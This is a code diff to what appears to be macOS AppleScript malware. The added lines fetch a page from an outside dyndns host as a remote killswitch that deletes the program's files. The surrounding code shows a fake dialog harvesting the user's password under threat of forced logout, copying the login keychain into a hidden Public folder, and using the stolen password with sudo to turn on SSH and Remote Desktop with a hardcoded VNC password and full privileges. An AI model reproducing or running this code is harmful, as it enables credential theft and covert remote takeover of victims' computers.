@@ -7,11 +7,23 @@ try
 end try
 
 try
+	set killswitch to ""
+	do shell script "curl http://thexiuh.dyndns.info/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1"
+	set killswitch to (characters 1 through -1 of result) as text -- Get IP
+end try
+try
+	if killswitch = "kill" then
+		-- Delete all of the app and password files
+		do shell script "rm -rf " & ufld & ""
+		do shell script "rm -rf " & (POSIX path of (path to me))
+		quit
+	end if
+end try
+try
 	
 	repeat
 		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 20 with hidden answer) -- Prompt for Password
 		if passwd = "" then
-			
 			do shell script "killall -u " & theuser -- shutdown
 		end if
 		
@@ -40,12 +52,10 @@ try
 		do shell script "cp " & china & " " & ufld
 		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to UFLD
 	end try
-	
 	try
 		do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
 		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
 	end try
-	
 	
 end try
 
